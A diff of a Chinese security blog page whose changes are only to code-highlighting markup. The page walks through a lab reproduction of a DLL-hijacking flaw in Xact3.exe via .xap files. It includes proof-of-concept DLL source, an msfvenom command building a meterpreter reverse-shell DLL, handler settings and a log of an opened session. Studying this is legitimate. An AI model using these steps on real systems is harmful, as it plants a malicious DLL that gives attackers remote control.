@@ -93,9 +93,9 @@
 <p>首先，漏洞披露详情如下：</p>
 <pre tabindex="0"><code>Exploit/POC
 =============
-1) create DLL 32bit DLL named &quot;xbdm.dll&quot; and place on a remote share
+1) create DLL 32bit DLL named &#34;xbdm.dll&#34; and place on a remote share
 
-2) create an empty file with a &quot;.xap&quot; extension on the same share, this will open using &quot;Xact3.exe&quot; as its default
+2) create an empty file with a &#34;.xap&#34; extension on the same share, this will open using &#34;Xact3.exe&#34; as its default
 
 3) open the the .xap file from the Network share then BOOM!
 </code></pre><p>一共两步，第一步是创建两个文件，分别是<code>.xap</code>文件和<code>xbdm.dll</code>。</p>
@@ -140,130 +140,130 @@
 <h2 id="0x02-利用过程">0x02 利用过程</h2>
 <p>漏洞作者披露的文章中附带了测试的POC，但是需要编译，我们可以使用MSF直接生成DLL测试。</p>
 <p>作者POC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">/* hyp3rlinx */</span>
-
-<span style="color:#75715e">/*
-</span><span style="color:#75715e">gcc -c -m32 xbdm.c
-</span><span style="color:#75715e">gcc -shared -m32 -o xbdm.dll xbdm.o
-</span><span style="color:#75715e">*/</span>
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">executo</span>(){
- MessageBox( <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;3c184981367094fce3ab70efc3b44583&#34;</span> , <span style="color:#e6db74">&#34;philbin :)&#34;</span> , MB_YESNO <span style="color:#f92672">+</span> MB_ICONQUESTION );
-}
-
-BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
-<span style="color:#66d9ef">switch</span>(fdwReason){
-<span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:{
- executo();
-<span style="color:#66d9ef">break</span>;
-}
-<span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:{
- executo();
-<span style="color:#66d9ef">break</span>;
-}
-<span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:{
- executo();
-<span style="color:#66d9ef">break</span>;
-}
-<span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:{
- executo();
-<span style="color:#66d9ef">break</span>;
-}
-}
-
-<span style="color:#66d9ef">return</span> TRUE;
-}
-</code></pre></div><p>使用MSF生成DLL：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.137.79 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f dll -o /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: <span style="color:#ae81ff">341</span> bytes
-Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
-Saved as: /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
-</code></pre></div><p>MSF配置：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
-
-Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
-
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
-   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span style="color:#ae81ff">0</span>   Wildcard Target
-
-
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 2.
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.137.79:4444
-
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</code></pre></div><p>创建一个<code>.xap</code>文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* hyp3rlinx */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">gcc -c -m32 xbdm.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">gcc -shared -m32 -o xbdm.dll xbdm.o
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">executo</span>(){
+</span></span><span style="display:flex;"><span> MessageBox( <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;3c184981367094fce3ab70efc3b44583&#34;</span> , <span style="color:#e6db74">&#34;philbin :)&#34;</span> , MB_YESNO <span style="color:#f92672">+</span> MB_ICONQUESTION );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL WINAPI <span style="color:#a6e22e">DllMain</span>(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>(fdwReason){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:{
+</span></span><span style="display:flex;"><span> executo();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:{
+</span></span><span style="display:flex;"><span> executo();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:{
+</span></span><span style="display:flex;"><span> executo();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:{
+</span></span><span style="display:flex;"><span> executo();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用MSF生成DLL：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.137.79 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f dll -o /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>No encoder or badchars specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">341</span> bytes
+</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">5120</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: /media/liyingzhe/Writing/Mystudy/Exploit/xbdm.dll
+</span></span></code></pre></div><p>MSF配置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit -j
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 2.
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.137.79:4444
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>创建一个<code>.xap</code>文件：</p>
 <pre tabindex="0"><code>touch .xap
 </code></pre><p>打开<code>.xap</code>文件，获得会话：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2876a808-4f5f-11ec-8a46-00d861bf4abb.png" alt="0x03"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; jobs
-
-Jobs
-<span style="color:#f92672">====</span>
-
-  Id  Name                    Payload                          Payload opts
-  --  ----                    -------                          ------------
-  <span style="color:#ae81ff">2</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.137.79:4444
-
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">179779</span> bytes<span style="color:#f92672">)</span> to 192.168.137.71
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.137.79:4444 -&gt; 192.168.137.71:49236<span style="color:#f92672">)</span> at 2018-08-15 18:31:59 +0800
-
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">2</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
-
-meterpreter &gt; getuid
-Server username: John-Thunderobt<span style="color:#ae81ff">\J</span>ohn
-meterpreter &gt; background
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
-
-Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
-
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
-   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span style="color:#ae81ff">0</span>   Wildcard Target
-
-
-msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
-</code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; jobs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Jobs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Id  Name                    Payload                          Payload opts
+</span></span><span style="display:flex;"><span>  --  ----                    -------                          ------------
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.137.79:4444
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">179779</span> bytes<span style="color:#f92672">)</span> to 192.168.137.71
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>192.168.137.79:4444 -&gt; 192.168.137.71:49236<span style="color:#f92672">)</span> at 2018-08-15 18:31:59 +0800
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: John-Thunderobt<span style="color:#ae81ff">\J</span>ohn
+</span></span><span style="display:flex;"><span>meterpreter &gt; background
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 2...
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     192.168.137.79   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><h2 id="0x03-总结">0x03 总结</h2>
 <p>本片文章主要涉及了<code>Process Monitor</code>过滤器的使用，方便快速定位指定进程。</p>
 <p>并且复习了DLL劫持漏洞的原理，及利用方式。</p>
 <h2 id="0x04-参考">0x04 参考</h2>
